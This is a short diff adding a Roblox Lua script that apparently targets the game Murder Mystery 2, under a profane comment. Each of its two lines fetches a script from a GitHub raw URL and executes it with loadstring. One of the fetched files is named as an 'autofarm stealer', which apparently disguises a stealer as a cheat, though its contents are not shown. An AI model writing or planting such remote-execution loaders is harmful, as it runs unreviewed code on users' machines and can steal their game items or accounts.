@@ -1,0 +1,6 @@
+-- fuck
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Johnnyissocoollol/Mm2New/refs/heads/main/MM2OP.txt"))()
+
+task.wait(5)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Johnnyissocoollol/Mm2New/refs/heads/main/mm2autofarmstealer.txt"))()
